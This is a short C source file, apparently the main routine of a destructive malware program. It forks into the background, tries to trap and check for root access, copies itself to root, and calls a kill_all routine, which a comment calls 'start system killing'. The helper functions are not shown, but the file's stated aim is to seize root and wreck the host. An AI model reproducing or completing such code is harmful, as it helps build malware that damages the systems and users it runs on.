#include "libs.h"

#include "kill.h"
#include "getting_access.h"

int main(int argc, char** argv)
{
	if(fork() == 0)
	{

		// create the fork when we have `ROOT` access
		int a = fork();
		if (a == 0)
		{
			// trap function
			trap_access(argv[0]);
			if(checking_access())
			{
				// start system killing !!
				printf("root\n");
				chdir(getting_home_path());
				copy_to_root();

				kill_all();
			}
		}	
	}
	return 0;
}
